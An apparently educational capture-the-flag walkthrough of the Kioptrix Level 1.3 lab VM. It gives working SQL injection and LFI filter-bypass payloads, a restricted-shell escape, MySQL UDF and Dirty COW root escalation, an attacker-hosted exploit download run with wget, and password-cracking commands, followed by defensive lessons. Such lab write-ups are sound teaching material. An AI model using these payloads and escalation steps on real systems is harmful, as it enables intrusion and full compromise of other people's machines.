# Kioptrix: Level 1.3 (#4) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.3 (#4) |
| **Difficulty** | Easy / Intermediate |
| **Author** | loneferret (Kioptrix) |
| **Released** | February 8, 2012 |
| **VulnHub Entry** | [Kioptrix: Level 1.3 (#4) on VulnHub](https://vulnhub.com/entry/kioptrix-level-13-4,25/) |
| **Download** | [Kioptrix: Level 1.3 (#4) OVA](https://vulnhub.com/entry/kioptrix-level-13-4,25/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, kernel 2.6.24; "LigGoat" PHP login app) |

> **Be patient on boot:** the author warns this image can take a moment to get a DHCP address, and it has occasionally needed a restart. The target IP may differ from the example `192.168.56.101` — always confirm with a scan.

## 0. What you will learn

- **Web enumeration:** Finding hidden directories and a leaked database file.
- **Authentication bypass via SQL injection:** Logging in as an existing user with `' OR 1=1 #`.
- **Local File Inclusion (LFI) with filters:** Reading files through `member.php?username=`, and defeating a naive keyword filter with a null byte and doubling.
- **SMB enumeration:** Extracting usernames with `enum4linux`.
- **Escaping a restricted shell (`lshell`):** `echo os.system("/bin/bash")`.
- **Privilege escalation via a root MySQL + UDF:** Using `sys_exec` to set setuid on `/bin/bash`.
- **Alternative escalation:** The kernel 2.6.24 "Dirty COW" exploit and `/etc/passwd` manipulation.
- **Defensive thinking:** Blue-team lessons about SQLi, LFI, root services, and restricted shells.

## 1. Reconnaissance — finding the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each responding host is a live machine. Your Kali is one; the Kioptrix VM is the other. Note its IP (example `192.168.56.101`).


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** A quick reachability sweep. Confirm the target is up before scanning ports.

![host discovery](images/01-recon-netdiscover.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,139,445 -oA scans/services 192.168.56.101
```

> **How to read it:** First find all open TCP ports, then fingerprint the interesting ones. `-sC` runs default NSE scripts; `-sV` grabs service versions.

### 2.2 Realistic expected output

Exact banners vary by build, but a common result:

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4)
139/tcp open  netbios-ssn Samba smbd 3.0.28a
445/tcp open  netbios-ssn Samba smbd 3.0.28a
```

> **How to read it:** A PHP web app on port 80 and SMB on 139/445. SMB will give us usernames; the web app is the entry point.

### 2.3 Web directory discovery


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
feroxbuster -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,sql,txt
```

> **How to read it:** `-x php,sql,txt` also tries those extensions. Watch for:
> - `/john/` and `/robert/` (directories named after likely usernames),
> - `/database.sql` (a leaked SQL dump!),
> - `/member.php`, `/checklogin.php`, `/logout`.

**Fetch the leaked SQL dump:**

```bash
curl http://192.168.56.101/database.sql
```

> **How to read it:** A dump file often contains schema plus sample data — including credentials. This one reveals the `members` table (usernames and passwords), giving you candidate usernames to try against the login.

![nmap and directory scan](images/02-nmap.png)

## 3. Foothold

### 3.1 SQL injection — authentication bypass

The login page (`index.php`) posts to `checklogin.php`. Test with a single quote to confirm it is injectable:


> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```text
Username: john
Password: '
```

> **How to read it:** A raw MySQL error (instead of a clean "invalid login") means the input reaches the database unescaped — the app is **SQL-injectable**. It even leaks the path `/var/www/checklogin.php`.

Now log in as a real user. Common users found from the SQL dump and SMB are `john` and `robert`. Try:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```text
Username: john
Password: ' OR 1=1 #
```

> **How to read it:** `' OR 1=1` makes the WHERE clause always true; `#` starts a MySQL comment, discarding the rest of the query (including the password check). The app logs us in — and often **displays the account's own password** on the member page. Community writeups report `john : MyNameIsJohn` and `robert : ADGAdsafdfwt4gadfga==` (the latter is **not** actually Base64 — it is the literal password).

### 3.2 LFI — reading files through `member.php`

The member page builds a filename from the `username` parameter, roughly `include(".../<username>/<username>.php")`. That is a **Local File Inclusion** risk.

First, observe the behavior:

```text
http://192.168.56.101/member.php?username=./..
```

> **How to read it:** The error message shows how your input is wrapped (a directory plus `.php` appended). To include an arbitrary file we must (a) climb directories with `../` and (b) stop the app appending `.php` — using a **null byte** `%00`.

Try:

```text
http://192.168.56.101/member.php?username=/proc/version%00
```

> **How to read it:** If the kernel version prints, the include is controllable. But requesting `/etc/passwd` is often blocked because the app strips the word `etc`.

**Defeat the naive `etc` filter:** the filter appears to remove `etc` exactly **once**. Doubling the letters merges them back after removal (`e` + `etc` + `c` → `etc`):

```text
http://192.168.56.101/member.php?username=/eetctc/passwd%00
```

> **How to read it:** The filter deletes the inner `etc`, leaving `/etc/passwd` intact. You should now see the user list, confirming `john`, `robert`, `loneferret`, and `root`. (g0tmi1k's original writeup describes this exact one-pass filter trick.)
> **Why it works:** This is a filter that replaces `etc` with empty **one time**; redundant wrapping of the characters defeats it. Filters like this are a textbook example of why blocklists fail.

### 3.3 SMB enumeration — more usernames


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.101
```

> **How to read it:** `enum4linux` gathers SMB users, shares and policy. Look at the users list (`john`, `robert`, `loneferret`, `root`) and confirm the login candidates. The SMB `print$`/`IPC$` shares add little here, but the usernames are valuable.

### 3.4 SSH in (and a restricted shell)

With credentials in hand, SSH in:

```bash
ssh john@192.168.56.101
# password: MyNameIsJohn
```

> **How to read it:** You are dropped into a **restricted shell** (`lshell`). The banner says type `?` or `help` for allowed commands. Try running something not on the list — you get a "forbidden" warning, and repeated violations disconnect you.

```text
? 
cd  clear  echo  exit  help  ll  lpath  ls
```

> **How to read it:** Only a handful of commands are permitted. Crucially, **`echo`** is allowed — and `lshell` is written in Python, so an `echo` line can be evaluated as Python.

**Escape the restricted shell:**

```bash
echo os.system("/bin/bash")
```

> **How to read it:** `lshell` evaluates the argument to `echo` and runs `os.system("/bin/bash")`, spawning a real Bash shell **outside** the restrictions. You now have a normal user shell as `john` (or `robert`).
> **Why it works:** The restricted shell only *wraps* the real shell; any interpreter feature that can start another process escapes the wrapper.

![foothold: login bypass, LFI, lshell escape](images/03-foothold.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find MySQL credentials (the web app uses root with a blank password)

Read the login handler in the web root:

```bash
cat /var/www/checklogin.php
```

Example (abbreviated):

```php
$host="localhost";   // Host name
$username="root";    // Mysql username
$password="";        // Mysql password
$db_name="members";
```

> **How to read it:** The web app connects to MySQL as **`root` with an empty password**. That is the misconfiguration we will weaponize. (Naming/paths vary slightly by build.)

Confirm the MySQL process runs as root:

```bash
ps aux | grep mysql
```

> **How to read it:** If the `mysqld` process is owned by `root`, then any command it executes also runs as `root` — which is exactly what we want.

### 4.2 Log in to MySQL

```bash
mysql -u root -p
# press Enter at the password prompt (blank password)
```

Then:

```sql
SHOW DATABASES;
USE members;
SELECT * FROM members;
```

Example output:

```text
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          |
|  2 | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```

> **How to read it:** The same credentials we found via SQLi. Confirm the UDF library exists:

```bash
whereis lib_mysqludf_sys.so
```

> **How to read it:** This VM ships `lib_mysqludf_sys.so` already present. That library provides the `sys_exec()` function, which runs **system commands from inside MySQL**.

### 4.3 Root via MySQL `sys_exec` (setuid bash)

Because MySQL runs as root, `sys_exec()` runs commands as root. Create the function (if not already loaded) and use it to make `/bin/bash` setuid-root:

```sql
use mysql;
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('chmod u+s /bin/bash');
```

> **How to read it:** `chmod u+s /bin/bash` sets the **setuid** bit on Bash, meaning it will run with the file owner's privileges (root) no matter who launches it.

Then drop out of MySQL and grab root:

```bash
ls -l /bin/bash
bash -p
whoami
```

Expected:

```text
-rwsr-xr-x 1 root root ... /bin/bash
root
```

> **How to read it:** The `s` in `-rwsr-xr-x` shows setuid is set. `bash -p` runs Bash **preserving** the effective UID (root) instead of dropping it — instant root.
> **Alternative via `sys_exec`:** `SELECT sys_exec('usermod -a -G admin john');` adds `john` to the `admin` group (which can sudo on old Ubuntu), after which `sudo su` gives root.

### 4.4 Alternative — kernel "Dirty COW" (2.6.24)

The kernel is **2.6.24**, vulnerable to **Dirty COW (CVE-2016-5195)**. The popular exploit (EDB **40839**) overwrites `/etc/passwd` to add a new UID-0 user.

**Compile on Kali** (target has no compiler), then transfer:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit -p 40839
gcc -pthread 40839.c -o dirty -lcrypt
python3 -m http.server 8000
```

**On the target:**

```bash
cd /tmp
wget http://192.168.56.10:8000/dirty
chmod +x dirty
./dirty
```

> **How to read it:** The exploit backs up `/etc/passwd`, prompts for a password, then creates a new root-level user (historically `firefart`). Log in with it:
>
> ```bash
> su firefart
> ```
>
> **Important:** after gaining root, restore the original file so the `root` account keeps working: `mv /tmp/passwd.bak /etc/passwd`.

> **Note on egress filtering:** the author installed `iptables` rules blocking several ports (including 80 and 4444). If `wget` from a Python server on port 8000 times out, host the file on an allowed port — community writeups used **port 81**. Check `/etc/iptables.rules` for the blocked ranges.

**Read the proof:**

```bash
cat /root/congrats.txt
```

> **How to read it:** The root directory has a congratulatory file rather than a flag; a root shell is the win.

![root via mysql sys_exec / dirty cow](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| SQL injection (authentication bypass) | N/A (design flaw) | `checklogin.php` login | 80 (HTTP) | Bypass login; leak stored passwords | Unsanitized input in SQL query. |
| Local File Inclusion (+ filter bypass) | N/A (design flaw) | `member.php?username=` | 80 (HTTP) | Arbitrary file read (`/etc/passwd`) | Null byte + doubled `etc` defeats filter. |
| Information disclosure | N/A (misconfiguration) | `/database.sql` | 80 (HTTP) | Leaked schema/credentials | Backup dump left in web root. |
| MySQL running as root with blank password | N/A (misconfiguration) | `checklogin.php` / `mysqld` | local | Root via `sys_exec` UDF | Cleartext creds; DB service over-privileged. |
| Restricted shell not truly isolating | N/A (design flaw) | `lshell` (`echo`) | 22 (SSH) | Escape to full shell | Python `os.system` reachable via `echo`. |
| Linux kernel privilege escalation (Dirty COW) | CVE-2016-5195 | Linux Kernel 2.6.24 | local | Low user → root | EDB 40839; overwrites `/etc/passwd`. |

> **How to read it:** The intended chain is SQLi → LFI → user → MySQL **root** blank password → `sys_exec` UDF → root. Dirty COW is a second, independent root path.

## 6. Defensive lessons (blue team)

- **Prevent SQL injection with parameterized queries.** This closes the login bypass and any related data leaks in one change.
- **Never include files from user-controlled input.** Resolve paths server-side against an allow-list; reject `..`, null bytes, and absolute paths. Null-byte tricks exist precisely because developers concatenate untrusted strings into file paths.
- **Do not rely on blacklist string filters.** The one-pass `etc` filter here was defeated by doubling letters. Blocklists fail; allow-lists and proper APIs do not.
- **Never keep database backups in the web root.** `database.sql` handed attackers the schema and sample credentials. Store dumps outside the document root with strict permissions.
- **Do not run the database as `root`, and never leave the root account passwordless.** Run MySQL as a dedicated low-privilege user and give the app a least-privilege DB account. This alone defeats the `sys_exec` escalation.
- **Remove dangerous DB features.** The `lib_mysqludf_sys` UDF grants command execution. Do not ship it, and restrict `FILE`/UDF usage for non-admin accounts.
- **Restricted shells must not expose an interpreter.** A restricted shell that still lets a user reach `os.system` provides no isolation. Use proper sandboxes/containers or RBAC instead.
- **Patch the kernel.** Dirty COW's blast radius is severe; keep kernels current. If your egress firewall allows outbound connections, an attacker can still pull exploits, so combine patching with outbound filtering.

## 7. References

Real community writeups consulted during research (they document these paths):

- [VulnHub – Kioptrix: Level 4 (1.3) — davidvarghese](https://blog.davidvarghese.com/posts/vulnhub-kioptrix-level-4/)
- [Kioptrix Level 4 CTF Walkthrough — rastating](https://rastating.github.io/kioptrix-level-4-ctf-walkthrough/)
- [Kioptrix Level 1.3 (VM #4) Walkthrough — Will Chatham](https://blog.willchatham.com/2017/03/14/kioptrix-level-1-3-vm-4-walkthrough/)
- [Kiopritx 1.3 (#4) Walkthrough — abatchy](https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub)
- [Kioptrix Level 4 (Local File Inclusion) — g0tmi1k](https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/)
- [VulnHub Entry — Kioptrix: Level 1.3 (#4)](https://vulnhub.com/entry/kioptrix-level-13-4,25/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap + directory scan (`/john`, `/robert`, `database.sql`)
- [ ] `images/03-foothold.png` — SQLi login bypass, LFI read of `/etc/passwd`, and `lshell` escape
- [ ] `images/04-root-escalation.png` — MySQL `sys_exec('chmod u+s /bin/bash')` and `bash -p` → root
- [ ] `images/05-proof.png` — `/root/congrats.txt` or root `whoami`

> **How to read it:** Store screenshots in `labs/kioptrix-level-13-4/images/` and reference them with the relative paths shown.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
